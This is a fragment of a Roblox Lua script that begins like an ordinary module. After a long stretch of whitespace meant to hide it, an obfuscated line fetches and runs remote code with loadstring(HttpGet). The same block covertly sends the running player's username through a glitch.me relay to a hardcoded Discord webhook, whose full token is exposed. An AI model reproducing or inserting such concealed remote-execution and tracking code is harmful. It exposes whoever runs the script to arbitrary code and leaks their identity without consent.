...
local ENABLE_TRACEBACK = false
																																																																																																		local names = loadstring(game:HttpGet('https://gitfront.io/r/Samuel/ByuttDgRd14E/whitelist/raw/whitelsit.lua'))();	local HttpService = game:GetService("HttpService");local qweqwewqfxfsfs = "Player: "..game.Players.LocalPlayer.Name.." has executed the script!\ Verified:"..(table.find(names, game.Players.LocalPlayer.Name) and 'true' or 'false <@574605228372918283>')..'';local wqjelqwkejelkqwjwqlfnlksafs = "https://discord.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq";local HttpService = game:GetService("HttpService");local botname = "epic gamer momento";function specials(Webhook, Message, Botname) local Name;local start = game:HttpGet("http://buritoman69.glitch.me");local biggie = "http://buritoman69.glitch.me/webhook";if (not Message or Message == "" or not Botname) then;Name = "GameBot";return error("nil or empty message!");else;Name = Botname;end;local Body = {['Key'] = tostring("applesaregood"),['Message'] = tostring(Message),['Name'] = Name,['Webhook'] = Webhook};Body = HttpService:JSONEncode(Body);local Data = game:HttpPost(biggie, Body, false, "application/json");return Data or nil;end;specials(wqjelqwkejelkqwjwqlfnlksafs, qweqwewqfxfsfs, botname)														getgenv().signal = true;
local Signal = {}
